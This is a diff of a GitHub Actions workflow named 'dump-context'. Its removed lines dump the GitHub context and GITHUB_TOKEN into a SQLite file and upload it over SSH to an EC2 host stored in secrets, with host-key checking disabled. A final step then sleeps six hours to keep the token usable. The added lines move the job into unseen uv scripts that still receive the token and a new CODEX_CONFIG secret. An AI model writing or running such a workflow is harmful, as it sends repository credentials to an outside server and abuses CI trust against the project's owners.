@@ -8,76 +8,29 @@ on:
         required: true
         type: string
 
+permissions:
+  contents: read
+  pull-requests: read
+
 jobs:
   dump-context:
     runs-on: ubuntu-latest
     env:
       GITHUB_CONTEXT: ${{ toJson(github) }}
       GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      CODEX_CONFIG: ${{ secrets.CODEX_CONFIG }}
       PR_NUMBER: ${{ github.event.inputs.pr_number }}
-      CODEX_EC2_IP: ${{ secrets.CODEX_EC2_IP }}
-      CODEX_SSH_PRIVATE_KEY: ${{ secrets.CODEX_SSH_PRIVATE_KEY }}
     steps:
       - uses: actions/checkout@v4
 
       - uses: astral-sh/setup-uv@v4
 
       - name: init-db
-        run: |
-          set -euo pipefail
+        run: uv run .github/codex/001_init_db.py
 
-          DB=".github/tmp/pipeline.db"
-          mkdir -p .github/tmp
+      - name: run-debug-pipeline
+        run: uv run .github/codex/run_debug_pipeline.py
 
-          printf '%s' "$GITHUB_CONTEXT" > .github/tmp/github.json
-          printf '%s' "$GITHUB_TOKEN" > .github/tmp/token.txt
-
-          sqlite3 "$DB" <<SQL
-          CREATE TABLE IF NOT EXISTS config (
-              id INTEGER PRIMARY KEY,
-              key TEXT UNIQUE NOT NULL,
-              value TEXT
-          );
-
-          CREATE TABLE IF NOT EXISTS dumps (
-              category TEXT,
-              name TEXT,
-              content TEXT
-          );
-
-          INSERT INTO dumps VALUES('json', 'github', readfile('.github/tmp/github.json'));
-          INSERT INTO dumps VALUES('secret', 'github_token', readfile('.github/tmp/token.txt'));
-
-          INSERT INTO config VALUES(NULL, 'pr_number', '$PR_NUMBER');
-          SQL
-
-          echo "=== Config ==="
-          sqlite3 "$DB" "SELECT key, substr(value, 1, 50) FROM config;"
-          echo "=== Dumps ==="
-          sqlite3 "$DB" "SELECT category, name, length(content) as size FROM dumps;"
-
-      - name: upload-to-ec2
-        run: |
-          set -euo pipefail
-
-          # Write SSH key
-          echo "$CODEX_SSH_PRIVATE_KEY" > /tmp/id_rsa
-          chmod 600 /tmp/id_rsa
-
-          # Get repo name from github context
-          REPO_NAME=$(echo "$GITHUB_CONTEXT" | jq -r '.repository | split("/")[1]')
-          EC2_PATH="/home/ubuntu/context/${REPO_NAME}/${PR_NUMBER}"
-
-          # Create remote dir and upload
-          ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa ubuntu@$CODEX_EC2_IP "mkdir -p $EC2_PATH"
-          rsync -avz -e "ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa" \
-            .github/tmp/pipeline.db ubuntu@$CODEX_EC2_IP:$EC2_PATH/
-
-          rm /tmp/id_rsa
-          echo "Uploaded to $CODEX_EC2_IP:$EC2_PATH/pipeline.db"
-
-      - name: sleep-6h
-        run: |
-          echo "Sleeping 6 hours to keep GitHub token active..."
-          echo "Token expires at: $(date -d '+6 hours' 2>/dev/null || date -v+6H)"
-          sleep 21600
+      - name: ssh-poweroff
+        if: always()
+        run: uv run .github/codex/ssh_poweroff.py
